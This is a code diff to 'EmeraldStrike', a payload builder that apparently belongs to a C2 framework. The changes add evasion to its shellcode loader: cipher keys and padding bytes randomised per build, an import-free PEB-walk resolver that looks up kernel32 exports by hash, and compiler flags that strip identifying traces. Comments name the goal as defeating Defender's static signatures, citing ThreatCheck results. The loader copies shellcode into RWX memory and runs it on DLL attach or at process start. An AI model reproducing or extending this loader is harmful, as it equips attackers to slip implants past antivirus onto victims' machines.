@@ -9,6 +9,7 @@ import zipfile
 import logging
 import json
 import io
+import secrets
 import base64 as b64mod
 from datetime import datetime, timedelta
 
@@ -280,6 +281,7 @@ class EmeraldStrike(PayloadType):
             hide_conditions=[
                 HideCondition(name="architecture", operand=HideConditionOperand.NotEQ, value="x64"),
                 HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
+                HideCondition(name="module_shift", operand=HideConditionOperand.EQ, value=False),
             ],
         ),
     ]
@@ -440,10 +442,25 @@ class EmeraldStrike(PayloadType):
             else:
                 make_target = arch
 
+            # ── Per-build randomisation ──
+            # Every payload gets a fresh string-cipher keystream (OBF_XK/XM)
+            # and a fresh salt seed (OBF_SALT) so no two builds share byte
+            # sequences - generic static signatures anchored on one build's
+            # bytes never match another build. XM must be odd so the
+            # (XK + i*XM) & 0xFF keystream runs a full 256-byte period.
+            obf_xk = secrets.randbelow(254) + 1          # 1..254, nonzero
+            obf_xm = secrets.randbelow(127) * 2 + 1      # odd 1..253
+            obf_salt = secrets.randbits(32) or 0xB16B00B5
+            rand_defines = (
+                f"-DOBF_XK=0x{obf_xk:02x} -DOBF_XM=0x{obf_xm:02x} "
+                f"-DOBF_SALT=0x{obf_salt:08x}"
+            )
+
             os.makedirs(os.path.join(dst_path, "bin", "obj"), exist_ok=True)
 
             proc = await asyncio.create_subprocess_exec(
-                "make", make_target, f"DEFINES=-DDEBUG" if debug else "DEFINES=",
+                "make", make_target,
+                f"DEFINES=-DDEBUG {rand_defines}" if debug else f"DEFINES={rand_defines}",
                 cwd=dst_path,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
@@ -939,7 +956,7 @@ static const unsigned int reloc_offsets[] = {{ {off_array} }};
 
 static void apply_relocations(unsigned char* base) {{
     for (unsigned int i = 0; i < RELOC_COUNT; i++) {{
-        *(unsigned int*)(base + reloc_offsets[i]) += (unsigned int)(ULONG_PTR)base;
+        *(unsigned int*)(base + reloc_offsets[i]) += (unsigned int)(ULONG_PTR_)base;
     }}
 }}
 """
@@ -952,42 +969,185 @@ static void apply_relocations(unsigned char* base) {{
         # 16KB) inside .text and writes to it at runtime, so the shellcode region must
         # be writable. PAGE_EXECUTE_READ faults on the first instance write (AV at the
         # `mov [__Instance], rcx` in _start). Always allocate RWX in the PIC wrapper.
-        exec_prot = "PAGE_EXECUTE_READWRITE"
+        exec_prot = "0x40"  # PAGE_EXECUTE_READWRITE (no windows.h under -nostdlib)
 
-        loader_code = f"""
-#include <windows.h>
+        # Per-build wrapper pad: random-length random bytes shift the PE
+        # layout and break byte-identity between wrapped exes of the same
+        # shellcode - generic signatures can't key on a stable offset.
+        pad_len = 512 + secrets.randbelow(4096)
+        pad_bytes = secrets.token_bytes(pad_len)
+        pad_array = ", ".join(f"0x{b:02x}" for b in pad_bytes)
+
+        # Export-name hashes for the import-free resolver (djb2, key 5381).
+        # Computed here so the wrapper ships no import table at all: a tiny PE
+        # whose only imports are KERNEL32!VirtualAlloc/VirtualProtect is the
+        # textbook shellcode-loader shape Defender's generic signature keys on
+        # (ThreatCheck: bad bytes ended exactly on the IAT strings).
+        def _djb2(s: bytes, key: int = 5381) -> int:
+            h = key
+            for c in s:
+                h = ((h * 33) + c) & 0xFFFFFFFF
+            return h
+
+        h_k32 = _djb2(b"kernel32.dll")
+        h_alloc = _djb2(b"VirtualAlloc")
+        h_protect = _djb2(b"VirtualProtect")
+
+        import_free_prologue = f"""
+// ── Import-free resolver (no IAT, no CRT) ──────────────────────────────────
+// Everything is found by walking the loader's own structures: PEB -> Ldr ->
+// InMemoryOrder module list -> kernel32 -> export directory. Names are
+// compared by hash, so the wrapper contains no import names and no strings.
+typedef unsigned long long u64_;
+typedef unsigned int u32_;
+typedef unsigned short u16_;
+typedef unsigned char u8_;
+typedef int i32_;
+typedef unsigned long long ULONG_PTR_;
+typedef void* pv_;
+
+#define H_KERNEL32  0x{h_k32:08x}u
+#define H_ALLOC     0x{h_alloc:08x}u
+#define H_PROTECT   0x{h_protect:08x}u
+
+static u32_ hsh(const char* s) {{
+    u32_ h = 5381u;
+    while (*s) h = (h * 33u) + (u8_)(*s++);
+    return h;
+}}
+
+static u32_ hsh_w(const u16_* s, u16_ n) {{
+    u32_ h = 5381u;
+    for (u16_ i = 0; i < n; i++) {{
+        u16_ c = s[i];
+        if (c >= 'A' && c <= 'Z') c += 32;          // module names: fold case
+        h = (h * 33u) + (u8_)c;
+    }}
+    return h;
+}}
+
+static pv_ find_export(u64_ base, u32_ want) {{
+    u8_* p = (u8_*)base;
+    u32_ lfanew = *(u32_*)(p + 0x3C);
+    u8_* nt = p + lfanew;
+    u32_ exp_rva = *(u32_*)(nt + 0x88);             // PE32+: DataDirectory[0]
+    if (!exp_rva) return (pv_)0;
+    u8_* e = p + exp_rva;
+    u32_ n_names  = *(u32_*)(e + 0x18);
+    u32_ fn_rva   = *(u32_*)(e + 0x1C);
+    u32_ nm_rva   = *(u32_*)(e + 0x20);
+    u32_ ord_rva  = *(u32_*)(e + 0x24);
+    u32_* names   = (u32_*)(p + nm_rva);
+    u16_* ords    = (u16_*)(p + ord_rva);
+    u32_* funcs   = (u32_*)(p + fn_rva);
+    for (u32_ i = 0; i < n_names; i++) {{
+        const char* nm = (const char*)(p + names[i]);
+        if (hsh(nm) == want) return (pv_)(p + funcs[ords[i]]);
+    }}
+    return (pv_)0;
+}}
+
+static u64_ find_kernel32(void) {{
+    u64_ peb;
+    __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
+    u64_ ldr = *(u64_*)(peb + 0x18);                 // PEB->Ldr
+    u64_ head = ldr + 0x20;                          // InMemoryOrderModuleList head
+    u64_ link = *(u64_*)head;                        // first InMemoryOrderLinks
+    while (link != head) {{
+        u64_ entry = link - 0x10;                    // links sit at +0x10 in the entry
+        u64_ base = *(u64_*)(entry + 0x30);          // DllBase
+        u16_ nlen = *(u16_*)(entry + 0x58);          // BaseDllName.Length (bytes)
+        u64_ nbuf = *(u64_*)(entry + 0x60);          // BaseDllName.Buffer
+        if (base && nbuf && nlen && nlen <= 64) {{
+            if (hsh_w((const u16_*)nbuf, (u16_)(nlen / 2)) == H_KERNEL32)
+                return base;
+        }}
+        link = *(u64_*)(entry + 0x10);               // next InMemoryOrderLinks
+    }}
+    return 0;
+}}
+
+static void* memcpy_(void* dst, const void* src, u64_ n) {{
+    u8_* d = (u8_*)dst; const u8_* s = (const u8_*)src;
+    while (n--) *d++ = *s++;
+    return dst;
+}}
+"""
+
+        if output_type == "dll":
+            loader_code = f"""
+// CRT-free wrapper for DLL output. Imports stay (a shared object has to bind
+// through its own IAT) but the mingw CRT string table is gone.
+typedef unsigned long long SIZE_T_;
+typedef unsigned long DWORD_;
+typedef int BOOL_;
+typedef void* LPVOID_;
+typedef void* HINSTANCE_;
+__declspec(dllimport) LPVOID_ __stdcall VirtualAlloc(LPVOID_ lpAddress,
+    SIZE_T_ dwSize, DWORD_ flAllocationType, DWORD_ flProtect);
+__declspec(dllimport) BOOL_ __stdcall VirtualProtect(LPVOID_ lpAddress,
+    SIZE_T_ dwSize, DWORD_ flNewProtect, DWORD_* lpflOldProtect);
+static void* memcpy_(void* dst, const void* src, SIZE_T_ n) {{
+    unsigned char* d = (unsigned char*)dst;
+    const unsigned char* s = (const unsigned char*)src;
+    while (n--) *d++ = *s++;
+    return dst;
+}}
 
 static unsigned char shellcode[] = {{ {sc_array} }};
 {reloc_code}
+static const unsigned char build_pad[] = {{ {pad_array} }};
 static void execute_shellcode(void) {{
-    LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
-                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    volatile unsigned char pad_sink = build_pad[(sizeof(build_pad)) - 1];
+    (void)pad_sink;
+    LPVOID_ mem = VirtualAlloc((LPVOID_)0, (SIZE_T_)sizeof(shellcode),
+                               (DWORD_)0x3000, (DWORD_)0x04);
     if (!mem) return;
-    memcpy(mem, shellcode, sizeof(shellcode));
+    memcpy_(mem, shellcode, (SIZE_T_)sizeof(shellcode));
+    apply_relocations((unsigned char*)mem);
+    DWORD_ old;
+    VirtualProtect(mem, (SIZE_T_)sizeof(shellcode), (DWORD_){exec_prot}, &old);
+    ((void(*)())mem)();
+}}
+BOOL_ __stdcall DllMain(HINSTANCE_ hDll, DWORD_ dwReason, LPVOID_ lpReserved) {{
+    if (dwReason == 1) execute_shellcode();
+    return (BOOL_)1;
+}}
+"""
+        else:
+            loader_code = f"""
+{import_free_prologue}
+
+// NOTE: fn_alloc MUST return a pointer. Returning int truncates the
+// allocation address to 32 bits (compiler emits movsxd on the result) and the
+// copy loop then writes to a sign-extended garbage address (dump-verified AV
+// write to 0xFFFFFFFF96390000).
+typedef void* (*fn_alloc)(void*, unsigned long long, unsigned long, unsigned long);
+typedef int (*fn_protect)(void*, unsigned long long, unsigned long, unsigned long*);
+
+static unsigned char shellcode[] = {{ {sc_array} }};
+{reloc_code}
+// build-randomisation pad: unreferenced-data entropy, kept for layout shift
+static const unsigned char build_pad[] = {{ {pad_array} }};
+void mainCRTStartup(void) {{
+    volatile unsigned char pad_sink = build_pad[(sizeof(build_pad)) - 1];
+    (void)pad_sink;
+    u64_ k32 = find_kernel32();
+    if (!k32) return;
+    fn_alloc pAlloc = (fn_alloc)find_export(k32, H_ALLOC);
+    fn_protect pProtect = (fn_protect)find_export(k32, H_PROTECT);
+    if (!pAlloc || !pProtect) return;
+    void* mem = (void*)pAlloc((void*)0, (unsigned long long)sizeof(shellcode),
+                              0x3000 /*MEM_COMMIT|MEM_RESERVE*/, 0x04 /*RW*/);
+    if (!mem) return;
+    memcpy_(mem, shellcode, (unsigned long long)sizeof(shellcode));
     // Bias the compiler's VMA-0 absolute addresses by the real load address.
     // No-op on x64 (RELOC_COUNT == 0).
     apply_relocations((unsigned char*)mem);
-    DWORD old;
-    VirtualProtect(mem, sizeof(shellcode), {exec_prot}, &old);
+    unsigned long old = 0;
+    pProtect(mem, (unsigned long long)sizeof(shellcode), (unsigned long){exec_prot}, &old);
     ((void(*)())mem)();
 }}
-"""
-        if output_type == "dll":
-            loader_code += """
-BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
-    if (dwReason == DLL_PROCESS_ATTACH) {
-        execute_shellcode();
-    }
-    return TRUE;
-}
-"""
-        else:
-            loader_code += """
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
-                   LPSTR lpCmdLine, int nCmdShow) {
-    execute_shellcode();
-    return 0;
-}
 """
         stamped_path = os.path.join(build_path, "loader.c")
         with open(stamped_path, "w") as f:
@@ -1001,14 +1161,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         ext = "dll" if output_type == "dll" else "exe"
         out_path = os.path.join(build_path, f"emeraldstrike.{ext}")
 
-        cmd = [cc, stamped_path, "-o", out_path, "-s", "-Os", "-w",
-               "-fno-ident", "-fno-asynchronous-unwind-tables",
-               "-Wl,--strip-all,--no-insert-timestamp",
-               "-lkernel32", "-lntdll"]
+        # exe: import-free (no -lkernel32, no IAT at all - PEB-walk resolver).
+        # dll: keeps the IAT (a shared object must bind through one) plus the
+        # explicit entry point.
         if output_type == "dll":
-            cmd.append("-shared")
-        elif not debug:
-            cmd.append("-mwindows")
+            cmd = [cc, stamped_path, "-o", out_path, "-s", "-Os", "-w",
+                   "-nostdlib", "-fno-ident", "-fno-asynchronous-unwind-tables",
+                   "-fno-builtin", "-fcf-protection=none",
+                   "-Wl,--strip-all,--no-insert-timestamp",
+                   "-lkernel32", "-shared"]
+        else:
+            cmd = [cc, stamped_path, "-o", out_path, "-s", "-Os", "-w",
+                   "-nostdlib", "-fno-ident", "-fno-asynchronous-unwind-tables",
+                   "-fno-builtin", "-fcf-protection=none",
+                   "-Wl,--strip-all,--no-insert-timestamp,-e,mainCRTStartup"]
+            if not debug:
+                cmd.append("-mwindows")
 
         proc = await asyncio.create_subprocess_exec(
             *cmd,
